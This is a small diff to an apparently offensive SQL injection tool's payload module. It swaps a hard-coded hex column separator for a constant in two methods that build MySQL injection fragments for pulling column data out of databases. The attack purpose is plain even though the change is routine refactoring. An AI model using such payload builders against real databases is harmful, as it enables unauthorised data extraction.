@@ -219,7 +219,7 @@ namespace SuperSQLInjection.payload
         public static String creatMySQLColumnsStr(List<String> columns, String table, String dbName, int limit)
         {
 
-            StringBuilder sb = new StringBuilder("(select concat_ws(0x242424,");
+            StringBuilder sb = new StringBuilder("(select concat_ws("+ Comm.COLUMNS_SPLIT_HEX_STR + ",");
             foreach (String c in columns) {
                 sb.Append("ifnull("+c + ",0x20),");
             }
@@ -260,7 +260,7 @@ namespace SuperSQLInjection.payload
         /// <returns></returns>
         public static String concatMySQLColumnStr(List<String> columns)
         {
-            StringBuilder sb = new StringBuilder("concat(0x5e5e21,concat_ws(0x242424,");
+            StringBuilder sb = new StringBuilder("concat(0x5e5e21,concat_ws("+ Comm.COLUMNS_SPLIT_HEX_STR + ",");
             for (int i = 0; i < columns.Count; i++)
             {
                 if (columns.Count > 1)
